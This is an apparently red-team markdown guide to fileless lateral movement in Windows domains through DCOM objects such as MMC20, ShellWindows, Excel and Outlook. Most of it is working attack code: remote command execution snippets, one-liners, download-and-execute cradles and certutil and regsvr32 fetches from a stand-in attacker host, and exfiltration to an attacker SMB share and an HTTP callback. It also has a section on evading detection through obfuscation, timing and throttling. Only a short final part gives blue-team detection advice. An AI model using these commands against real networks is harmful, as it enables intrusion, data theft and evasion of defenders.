# DCOM-Based Fileless Lateral Movement Guide

## Table of Contents
1. [Overview](#overview)
2. [Prerequisites](#prerequisites)
3. [Attack Flow](#attack-flow)
4. [Step-by-Step Instructions](#step-by-step-instructions)
5. [DCOM Methods Explained](#dcom-methods-explained)
6. [Detection Evasion](#detection-evasion)
7. [Troubleshooting](#troubleshooting)
8. [Cleanup](#cleanup)

---

## Overview

### What is DCOM?

**Distributed Component Object Model (DCOM)** is Microsoft's technology for communication between software components on networked computers. It's an extension of COM (Component Object Model) that allows objects to communicate across network boundaries.

### Why Use DCOM for Lateral Movement?

**Advantages:**
- **Very Stealthy**: Less commonly monitored than WMI or PSExec
- **Fileless**: No binaries dropped to disk
- **Native**: Built into Windows since Windows 95/NT 4.0
- **Diverse Parent Processes**: Spawns from various legitimate processes (mmc.exe, explorer.exe, excel.exe)
- **Minimal Logging**: Often doesn't trigger the same alerts as WMI

**OPSEC Benefits:**
- Executes under different parent processes depending on method
- Network traffic looks like legitimate RPC/DCOM activity
- Very few SIEM rules specifically detect DCOM lateral movement
- Can blend with normal administrative COM operations

---

## Prerequisites

### Required Permissions
- **Domain Admin** (recommended)
- OR **Local Administrator** on target system
- OR Membership in **Distributed COM Users** group

### Network Requirements
- **Port 135** (RPC Endpoint Mapper) - TCP
- **Dynamic RPC ports** (49152-65535 by default) - TCP
- DCOM must be enabled on target

### Target Requirements
The target must have the specific COM objects installed:
- **MMC20.Application**: Requires Microsoft Management Console (standard on Windows)
- **ShellWindows**: Requires explorer.exe running
- **Excel.Application**: Requires Microsoft Excel installed
- **Outlook.Application**: Requires Microsoft Outlook installed

### DCOM Configuration

On the target, verify DCOM is enabled:

```powershell
# Check DCOM is enabled
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM"
# Should return: Y

# Check default authentication level
Get-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "LegacyAuthenticationLevel"
# Lower values are less restrictive (2-6 are common)
```

---

## Attack Flow

```
Attacker (Domain Admin)
    ↓
1. Test Connectivity (Port 135 - RPC/DCOM)
    ↓
2. Determine Available DCOM Objects on Target
    ↓
3. Instantiate Remote COM Object
    ├─ MMC20.Application (mmc.exe)
    ├─ ShellWindows (explorer.exe)
    ├─ ShellBrowserWindow (explorer.exe)
    ├─ Excel.Application (excel.exe)
    └─ Outlook.Application (outlook.exe)
    ↓
4. Execute Command via COM Object Methods
    ↓
5. Command Spawns Under COM Parent Process
    ↓
6. Cleanup (Release COM objects, clear credentials)
```

---

## Step-by-Step Instructions

### Basic Usage

#### Example 1: Automatic Method Selection
```powershell
# Script tries all methods until one succeeds
.\DCOM-LateralMovement.ps1 -Target DC01 -Command "calc.exe"
```

**Expected Output:**
```
[*] Testing connectivity to DC01...
[+] Target port 135 (RPC/DCOM) is open
[*] Attempting method: MMC20
[+] Command executed successfully via MMC20.Application
[+] Operation completed successfully!
[*] Parent Process on Target: mmc.exe
```

#### Example 2: Specific Method
```powershell
# Force specific DCOM method
.\DCOM-LateralMovement.ps1 -Target 192.168.1.50 -Command "notepad.exe" -Method MMC20
```

#### Example 3: With Credentials
```powershell
$cred = Get-Credential DOMAIN\Administrator

.\DCOM-LateralMovement.ps1 -Target WEB01 -Command "cmd /c whoami > C:\temp\user.txt" -Credential $cred -Method ShellWindows
```

#### Example 4: Execute PowerShell Script Remotely
```powershell
# Host PowerShell script on web server
# python3 -m http.server 8080

# Download and execute in memory
$cmd = "powershell -WindowStyle Hidden -Command `"IEX (New-Object Net.WebClient).DownloadString('http://AttackerIP:8080/payload.ps1')`""

.\DCOM-LateralMovement.ps1 -Target SQL01 -Command $cmd -Method MMC20
```

---

## DCOM Methods Explained

### Method 1: MMC20.Application (Most Reliable)

**How it works:**
- Creates instance of Microsoft Management Console COM object
- Uses `ExecuteShellCommand` method to spawn processes
- Spawns from `mmc.exe` parent process

**Manual PowerShell:**
```powershell
$target = "DC01"
$command = "calc.exe"

# Get type from remote system
$type = [Type]::GetTypeFromProgID("MMC20.Application", $target)
$mmc = [Activator]::CreateInstance($type)

# Execute command
$mmc.Document.ActiveView.ExecuteShellCommand("cmd.exe", $null, "/c $command", "7")

# Cleanup
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($mmc) | Out-Null
```

**Detection Characteristics:**
- Event ID 4688: Process creation from `mmc.exe`
- Sysmon Event ID 1: ParentImage = `C:\Windows\System32\mmc.exe`
- Network: RPC connections to port 135

**Pros:**
- Very reliable (MMC is on all Windows systems)
- Well-documented method
- Consistent behavior

**Cons:**
- More well-known to defenders
- MMC spawning cmd.exe can be suspicious

---

### Method 2: ShellWindows (Stealthy)

**How it works:**
- Uses ShellWindows COM object to interact with existing explorer.exe windows
- Leverages `ShellExecute` method
- Spawns from `explorer.exe` parent process

**Manual PowerShell:**
```powershell
$target = "DC01"
$command = "calc.exe"

# Get ShellWindows CLSID
$type = [Type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39', $target)
$item = [Activator]::CreateInstance($type)

# Get explorer windows
$windows = $item.Windows()
$window = $windows.Item(0)

# Execute via ShellExecute
$window.Document.Application.ShellExecute("cmd.exe", "/c $command", "", "open", 0)

# Cleanup
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($windows) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($item) | Out-Null
```

**Detection Characteristics:**
- Process creation from `explorer.exe`
- Very normal parent process
- Harder to distinguish from legitimate user activity

**Pros:**
- Very stealthy (explorer.exe is expected to spawn processes)
- Less suspicious than MMC
- Blends with user activity

**Cons:**
- Requires explorer.exe to be running (usually is)
- Requires at least one explorer window
- May fail on servers without active desktop sessions

---

### Method 3: ShellBrowserWindow (Alternative Shell)

**How it works:**
- Similar to ShellWindows but uses ShellBrowserWindow CLSID
- Also spawns from `explorer.exe`
- Alternative when ShellWindows unavailable

**Manual PowerShell:**
```powershell
$target = "DC01"
$command = "calc.exe"

# ShellBrowserWindow CLSID
$type = [Type]::GetTypeFromCLSID('C08AFD90-F2A1-11D1-8455-00A0C91F3880', $target)
$shell = [Activator]::CreateInstance($type)

# Execute command
$shell.Document.Application.ShellExecute("cmd.exe", "/c $command", "", "open", 0)

# Cleanup
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
```

**Pros:**
- Stealthy like ShellWindows
- Fallback when ShellWindows fails

**Cons:**
- Same requirements as ShellWindows

---

### Method 4: Excel.Application (Office Abuse)

**How it works:**
- Instantiates Microsoft Excel COM object remotely
- Uses DDE (Dynamic Data Exchange) or macros to execute commands
- Spawns from `excel.exe`

**Manual PowerShell:**
```powershell
$target = "DC01"
$command = "calc.exe"

# Create remote Excel instance
$type = [Type]::GetTypeFromProgID("Excel.Application", $target)
$excel = [Activator]::CreateInstance($type)

# Execute via DDEInitiate (older Excel versions)
try {
    $excel.DDEInitiate("cmd", "/c $command")
} catch {
    Write-Host "DDE method failed (may require Excel config changes)"
}

# Cleanup
$excel.Quit()
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($excel) | Out-Null
```

**Pros:**
- Very unusual parent process for command execution
- May evade detection rules focused on cmd/powershell parents

**Cons:**
- Requires Excel installed on target
- DDE often disabled in modern Excel
- May trigger Office security warnings

---

### Method 5: Outlook.Application (Email Client Abuse)

**How it works:**
- Instantiates Outlook COM object
- Creates WScript.Shell via Outlook
- Executes command via Run method
- Spawns from `outlook.exe`

**Manual PowerShell:**
```powershell
$target = "DC01"
$command = "calc.exe"

# Create remote Outlook instance
$type = [Type]::GetTypeFromProgID("Outlook.Application", $target)
$outlook = [Activator]::CreateInstance($type)

# Create shell object via Outlook
$shell = $outlook.CreateObject("WScript.Shell")
$shell.Run($command, 0, $false)

# Cleanup
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($shell) | Out-Null
[System.Runtime.Interopservices.Marshal]::ReleaseComObject($outlook) | Out-Null
```

**Pros:**
- Very unusual execution chain
- Unlikely to be in detection rules

**Cons:**
- Requires Outlook installed
- May require Outlook profile configured
- Slower to instantiate

---

## Living Off The Land - Manual Commands

### Discovery: Enumerate Remote DCOM Objects

```powershell
# List available DCOM applications on remote system
$target = "DC01"

# Method 1: Registry enumeration via remote registry
$reg = [Microsoft.Win32.RegistryKey]::OpenRemoteBaseKey('ClassesRoot', $target)
$clsid = $reg.OpenSubKey("CLSID")

$clsid.GetSubKeyNames() | ForEach-Object {
    $key = $clsid.OpenSubKey("$_\LocalServer32")
    if ($key) {
        Write-Host "CLSID: $_ - LocalServer: $($key.GetValue(''))"
    }
}
```

### Discovery: Check DCOM Configuration

```powershell
# Check if DCOM is enabled on target
Invoke-Command -ComputerName DC01 -ScriptBlock {
    Get-ItemProperty -Path "HKLM:\Software\Microsoft\Ole" -Name "EnableDCOM"
}

# Check DCOM permissions
Get-WmiObject -ComputerName DC01 -Namespace "root\cimv2" -Class Win32_DCOMApplicationSetting |
    Select-Object AppID, Description, AuthenticationLevel
```

### Execute Commands Without Script

**Quick One-Liner (MMC20):**
```powershell
$c=[activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","TARGET"));$c.Document.ActiveView.ExecuteShellCommand("cmd",$null,"/c calc","7")
```

**Quick One-Liner (ShellWindows):**
```powershell
$c=[activator]::CreateInstance([type]::GetTypeFromCLSID('9BA05972-F6A8-11CF-A442-00A0C90A8F39',"TARGET"));$c.Windows().Item(0).Document.Application.ShellExecute("cmd","/c calc","","open",0)
```

### Output Retrieval

**Method A: SMB Share**
```powershell
# Setup share on attacker
New-SmbShare -Name "exfil" -Path "C:\exfil" -FullAccess "Everyone"

# Execute with redirection
$cmd = "cmd /c ipconfig > \\AttackerIP\exfil\output.txt"
.\DCOM-LateralMovement.ps1 -Target DC01 -Command $cmd -Method MMC20

# Retrieve
Get-Content C:\exfil\output.txt
```

**Method B: Web Callback**
```powershell
# Start listener: python3 -m http.server 8080

$cmd = @"
powershell -Command "`$o = whoami; Invoke-RestMethod -Uri 'http://AttackerIP:8080/?data=' -Method POST -Body `$o"
"@

.\DCOM-LateralMovement.ps1 -Target DC01 -Command $cmd -Method MMC20
```

---

## Detection Evasion

### What Blue Teams Look For

**Common DCOM Detection Indicators:**
1. Unusual parent processes spawning cmd.exe/powershell.exe:
   - mmc.exe → cmd.exe
   - explorer.exe → powershell.exe (from non-interactive session)
   - excel.exe/outlook.exe → cmd.exe
2. Network connections on port 135 from workstations to servers
3. Event ID 4688 with unusual parent process
4. Sysmon Event ID 1 with suspicious ParentImage
5. DCOM activation events (Event ID 10000-10010)

### Evasion Techniques

#### 1. Blend Execution Timing
```powershell
# Execute during business hours
$now = Get-Date
if ($now.Hour -lt 8 -or $now.Hour -gt 18) {
    Write-Host "Outside business hours - consider waiting"
    Start-Sleep -Seconds (Get-Random -Minimum 3600 -Maximum 14400)
}
```

#### 2. Use Native Binaries (LOLBAS)
```powershell
# Instead of obvious commands, use:

# Download via certutil
$cmd = "certutil -urlcache -f http://attacker/payload.exe C:\Windows\Temp\update.exe"

# Execute via rundll32
$cmd = "rundll32.exe C:\Windows\Temp\payload.dll,EntryPoint"

# Execute via regsvr32 (remote SCT)
$cmd = "regsvr32 /s /n /u /i:http://attacker/payload.sct scrobj.dll"

.\DCOM-LateralMovement.ps1 -Target DC01 -Command $cmd -Method ShellWindows
```

#### 3. Obfuscate Commands
```powershell
# Use environment variable obfuscation
$cmd = "cm%PROCESSOR_ARCHITECTURE:~-2,1% /c whoami"

# Use PowerShell encoded commands
$plaintext = "Get-Process"
$bytes = [System.Text.Encoding]::Unicode.GetBytes($plaintext)
$encoded = [Convert]::ToBase64String($bytes)
$cmd = "powershell -enc $encoded"

.\DCOM-LateralMovement.ps1 -Target DC01 -Command $cmd -Method MMC20
```

#### 4. Choose Less-Monitored Methods
```powershell
# ShellWindows is stealthier than MMC20
.\DCOM-LateralMovement.ps1 -Target DC01 -Command "calc" -Method ShellWindows

# Explorer.exe spawning processes is very common
# Much harder to detect than mmc.exe
```

#### 5. Throttle and Randomize
```powershell
# Don't hit multiple targets simultaneously
$targets = @("DC01", "WEB01", "SQL01")

foreach ($target in $targets) {
    # Random delay between targets (5-30 minutes)
    $delay = Get-Random -Minimum 300 -Maximum 1800
    Write-Host "Waiting $delay seconds before next target..."
    Start-Sleep -Seconds $delay

    .\DCOM-LateralMovement.ps1 -Target $target -Command "whoami" -Method ShellWindows
}
```

---

## Troubleshooting

### Error: "Retrieving the COM class factory failed"

**Causes:**
- DCOM disabled on target
- Firewall blocking port 135
- Required COM object not registered
- Insufficient permissions

**Solutions:**
```powershell
# Verify DCOM enabled on target
Invoke-Command -ComputerName TARGET -ScriptBlock {
    Get-ItemProperty HKLM:\Software\Microsoft\Ole -Name EnableDCOM
}

# If disabled, enable it (requires admin on target)
Invoke-Command -ComputerName TARGET -ScriptBlock {
    Set-ItemProperty HKLM:\Software\Microsoft\Ole -Name EnableDCOM -Value "Y"
}

# Check firewall
Test-NetConnection -ComputerName TARGET -Port 135

# Verify COM object exists
Invoke-Command -ComputerName TARGET -ScriptBlock {
    Get-ItemProperty "HKLM:\Software\Classes\MMC20.Application\CLSID"
}
```

### Error: "Access Denied"

**Causes:**
- Not admin on target
- DCOM permissions not granted

**Solutions:**
```powershell
# Verify you're admin
Invoke-Command -ComputerName TARGET -ScriptBlock { whoami /groups | findstr "S-1-5-32-544" }

# Grant DCOM permissions (on target as admin)
# Run dcomcnfg → Component Services → Computers → My Computer → Properties → COM Security
# Or via registry:
$acl = Get-Acl "HKLM:\Software\Microsoft\Ole"
# ... modify ACL to grant permissions
```

### No Explorer Windows Available

**Error:** "No explorer windows available on target"

**Cause:** ShellWindows method requires at least one explorer.exe window

**Solutions:**
```powershell
# Use different method
.\DCOM-LateralMovement.ps1 -Target DC01 -Command "calc" -Method MMC20

# OR start explorer remotely first
Invoke-WmiMethod -ComputerName DC01 -Class Win32_Process -Name Create -ArgumentList "explorer.exe"

# Wait a few seconds
Start-Sleep -Seconds 5

# Then try ShellWindows
.\DCOM-LateralMovement.ps1 -Target DC01 -Command "calc" -Method ShellWindows
```

---

## Cleanup

### Release COM Objects

Always release COM objects to avoid resource leaks:

```powershell
# If script fails mid-execution, manually release:
[System.GC]::Collect()
[System.GC]::WaitForPendingFinalizers()
[System.GC]::Collect()
```

### Remove Stored Credentials

If using credentials, they're stored temporarily:

```powershell
# List stored credentials
cmdkey /list

# Remove specific credential
cmdkey /delete:TARGETNAME

# Or remove all
cmdkey /list | Select-String "Target:" | ForEach-Object {
    $target = $_.ToString().Split(":")[1].Trim()
    cmdkey /delete:$target
}
```

### Kill Spawned Processes

If you spawned persistent processes:

```powershell
# List processes on target
Get-Process -ComputerName TARGET | Where-Object { $_.ProcessName -like "*suspicious*" }

# Kill specific process
Invoke-WmiMethod -ComputerName TARGET -Class Win32_Process -Name Create -ArgumentList "taskkill /F /PID 1234"

# Or via DCOM itself
.\DCOM-LateralMovement.ps1 -Target TARGET -Command "taskkill /F /IM notepad.exe" -Method MMC20
```

---

## Detection Testing

### Expected Event IDs

**Event ID 4688** (Security - Process Creation)
```
Parent Process: C:\Windows\System32\mmc.exe
New Process: C:\Windows\System32\cmd.exe
CommandLine: cmd.exe /c whoami
```

**Event ID 10000** (Microsoft-Windows-DistributedCOM)
```
DCOM got error attempting to start service
```

**Sysmon Event ID 1** (Process Creation)
```
ParentImage: C:\Windows\System32\mmc.exe
Image: C:\Windows\System32\cmd.exe
ParentCommandLine: "C:\Windows\system32\mmc.exe"
```

**Sysmon Event ID 3** (Network Connection)
```
DestinationPort: 135
Image: C:\Windows\System32\svchost.exe
```

**Sysmon Event ID 11** (File Creation)
If output redirected to file.

### Purple Team Discussion Points

After the exercise:

1. **Did blue team detect the DCOM execution?**
2. **Which method was hardest to detect?** (likely ShellWindows)
3. **Were there any alerts fired?**
4. **Could they distinguish from legitimate admin activity?**

**Recommendations for Blue Team:**
- Monitor for unusual parent/child process relationships
- Alert on mmc.exe/explorer.exe spawning cmd.exe or powershell.exe from non-interactive sessions
- Baseline normal DCOM usage patterns
- Monitor DCOM activation events (Event IDs 10000-10010)
- Network monitoring: workstation-to-server connections on port 135
- Consider application whitelisting to prevent unexpected process chains

---

## References

- [MITRE ATT&CK T1021.003 - Distributed Component Object Model](https://attack.mitre.org/techniques/T1021/003/)
- [Cybereason: DCOM Lateral Movement Techniques](https://www.cybereason.com/blog/dcom-lateral-movement-techniques)
- [Enigma0x3: Lateral Movement via DCOM](https://enigma0x3.net/tag/dcom/)
- [Microsoft DCOM Documentation](https://docs.microsoft.com/en-us/windows/win32/com/dcom)

---

**Remember:** This is for authorized red team training only. Unauthorized use is illegal.
